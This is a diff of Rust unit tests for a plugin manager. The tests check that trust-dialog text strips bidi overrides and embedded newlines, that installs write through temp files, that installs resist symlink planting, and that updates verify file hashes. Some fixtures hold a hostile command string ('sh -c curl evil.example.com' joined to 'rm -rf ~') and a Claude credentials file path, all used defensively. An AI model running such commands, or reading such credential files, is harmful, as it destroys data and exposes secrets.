+            detailed.contains("Reads credentials from: keychain \"svc\""),
             "detailed: {detailed}"
         );
         assert!(
@@ -10062,6 +11337,7 @@ mod title_tests {
             dest_hosts: Vec::new(),
             untrusted_hosts: Vec::new(),
             local_files: vec!["~/.claude/.credentials.json".to_string()],
+            credential_sources: Vec::new(),
             ping: Some("sh -c curl evil.example.com".to_string()),
             requires_approval: true,
         };
@@ -10086,6 +11362,49 @@ mod title_tests {
     }
 
     #[test]
+    fn build_trust_message_strips_a_newline_and_a_bidi_override_from_every_item() {
+        // A manifest string reaching this dialog is trusted for content,
+        // never for shape: a raw `\n` inside one item could make a single
+        // disclosed file masquerade as an extra labelled line, and a bidi
+        // override (U+202E) can make the *displayed* order of characters
+        // disagree with the bytes anyone reading the manifest would see.
+        let disclosure = TrustDisclosure {
+            engine: EngineKind::LogFile,
+            auth_types: Vec::new(),
+            dest_hosts: Vec::new(),
+            untrusted_hosts: Vec::new(),
+            local_files: vec!["evil\u{202E}\n.json".to_string()],
+            credential_sources: Vec::new(),
+            ping: Some("sh -c curl evil.example.com\u{2028}rm -rf ~".to_string()),
+            requires_approval: true,
+        };
+        let id = "plugin\nname\u{200F}";
+        let (short, detailed) = build_trust_message(id, &disclosure, &[]);
+
+        for rendered in [&short, &detailed] {
+            assert!(!rendered.contains('\u{202E}'), "{rendered:?}");
+            assert!(!rendered.contains('\u{200F}'), "{rendered:?}");
+            assert!(!rendered.contains('\u{2028}'), "{rendered:?}");
+        }
+        assert!(short.contains("plugin name"), "short: {short:?}");
+        assert!(detailed.contains("evil .json"), "detailed: {detailed:?}");
+        assert!(
+            detailed.contains("sh -c curl evil.example.com rm -rf ~"),
+            "detailed: {detailed:?}"
+        );
+        // Sanitising one *item* must not touch `detailed`'s own line
+        // structure — the `\n`s stripped out above were inside a single
+        // item, not the ones this format string uses to separate its own
+        // labelled lines (see `sanitize_trust_item`'s own doc for why it
+        // never runs over the assembled message).
+        assert_eq!(
+            detailed.lines().count(),
+            9,
+            "sanitising an item must not add or remove a labelled line: {detailed:?}"
+        );
+    }
+
+    #[test]
     fn build_trust_message_discloses_no_destinations_or_allowed_hosts_when_none_are_declared() {
         let disclosure = TrustDisclosure {
             engine: EngineKind::LogFile,
@@ -10093,6 +11412,7 @@ mod title_tests {
             dest_hosts: vec![],
             untrusted_hosts: vec![],
             local_files: Vec::new(),
+            credential_sources: Vec::new(),
             ping: None,
             requires_approval: false,
         };
@@ -10105,6 +11425,19 @@ mod title_tests {
             detailed.contains("Allowed hosts: (none declared)"),
             "detailed: {detailed}"
         );
+    }
+
+    #[test]
+    fn join_with_and_never_puts_a_comma_before_and() {
+        let s = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+        assert_eq!(join_with_and(&s(&[])), "");
+        assert_eq!(join_with_and(&s(&["a"])), "a");
+        assert_eq!(
+            join_with_and(&s(&["a", "b"])),
+            "a and b",
+            "two items read as \"a and b\", never \"a, and b\""
+        );
+        assert_eq!(join_with_and(&s(&["a", "b", "c"])), "a, b and c");
     }
 
     #[test]
@@ -10149,6 +11482,70 @@ mod title_tests {
             clobber.is_err(),
             "a second install of the same id must never overwrite the first"
         );
+    }
+
+    /// Proves the mechanics of the fix — a temp file that is renamed
+    /// away, never left sitting beside the manifest it became. See
+    /// `install_write`'s own doc comment for the failure this exists to stop:
+    /// a `write_all` that fails partway through the old direct-to-`target`
+    /// `create_new` left a manifest permanently stuck (a later attempt's own
+    /// `create_new` could never get past the partial file already "there");
+    /// this crate has no portable way to force a real disk-full mid-write, so
+    /// what a test can hold to is that a *successful* write goes through the
+    /// temp file and nothing of it survives past the rename.
+    #[test]
+    fn install_write_leaves_no_tmp_file_behind() {
+        let dir = temp_plugins_dir("install-write-tmp");
+        let bytes = stub_manifest_toml("recovers", 1).into_bytes();
+
+        install_write(&dir, "recovers", &bytes).expect("first write succeeds");
+        let tmp_left_behind = std::fs::read_dir(&dir)
+            .expect("plugins dir still readable")
+            .filter_map(Result::ok)
+            .any(|entry| {
+                entry
+                    .file_name()
+                    .to_string_lossy()
+                    .starts_with("recovers.toml.tmp")
+            });
+        let on_disk = std::fs::read(dir.join("recovers.toml")).unwrap();
+        std::fs::remove_dir_all(&dir).ok();
+
+        assert_eq!(on_disk, bytes);
+        assert!(
+            !tmp_left_behind,
+            "the temp file must be renamed away, never left sitting next to the target"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn install_write_will_not_follow_a_symlink_planted_on_its_temp_path() {
+        // Same predictable-temp-path attack `update_write`'s own test plants
+        // — a link left at the temp path used to be followed, truncating and
+        // overwriting its target outside the plugins directory entirely.
+        let dir = temp_plugins_dir("install-write-symlink");
+        let outside = dir.join("precious.txt");
+        std::fs::write(&outside, b"do not touch").unwrap();
+        let tmp = dir.join(format!("newid.toml.tmp{}", std::process::id()));
+        std::os::unix::fs::symlink(&outside, &tmp).expect("plant the link");
+
+        let bytes = stub_manifest_toml("newid", 1).into_bytes();
+        let result = install_write(&dir, "newid", &bytes);
+
+        let victim = std::fs::read(&outside).unwrap();
+        let manifest = std::fs::read(dir.join("newid.toml"));
+        std::fs::remove_dir_all(&dir).ok();
+
+        assert_eq!(
+            victim, b"do not touch",
+            "the link's target must be untouched"
+        );
+        assert!(
+            result.is_ok(),
+            "and the install itself still goes through: {result:?}"
+        );
+        assert_eq!(manifest.unwrap(), bytes);
     }
 
     #[test]
@@ -10227,6 +11624,38 @@ mod title_tests {
             err.is_err(),
             "there is nothing on disk to overwrite for this id"
         );
+    }
+
+    // ── update_target_unchanged (refuse to overwrite a hand-edit made after
+    //    "Check updates" ran and before the fetch it kicked off landed) ────
+
+    #[test]
+    fn update_target_unchanged_is_true_with_no_lockfile_entry_at_all() {
+        // A plugin installed by hand, or from before the lockfile existed:
+        // nothing recorded to compare the current file against, and
+        // `registry::diff_installed` already offers it as an update
+        // regardless of local edits — refusing here too would make it
+        // permanently un-updatable through this button.
+        assert!(update_target_unchanged(None, "anything"));
+    }
+
+    #[test]
+    fn update_target_unchanged_is_true_when_the_recorded_sha_still_matches() {
+        let sha = registry::sha256_hex(b"unchanged since the check");
+        assert!(update_target_unchanged(Some(&sha), &sha));
+    }
+
+    #[test]
+    fn update_target_unchanged_is_true_for_a_sha_differing_only_in_case() {
+        let sha = registry::sha256_hex(b"case only");
+        assert!(update_target_unchanged(Some(&sha.to_uppercase()), &sha));
+    }
+
+    #[test]
+    fn update_target_unchanged_is_false_when_the_file_moved_since_the_check() {
+        let recorded = registry::sha256_hex(b"what the check saw");
+        let current = registry::sha256_hex(b"a hand-edit made during the fetch and trust dialog");
+        assert!(!update_target_unchanged(Some(&recorded), &current));
     }
 
     // ── verify_manifest_id_matches_entry (id-consistency, defense in depth) ─
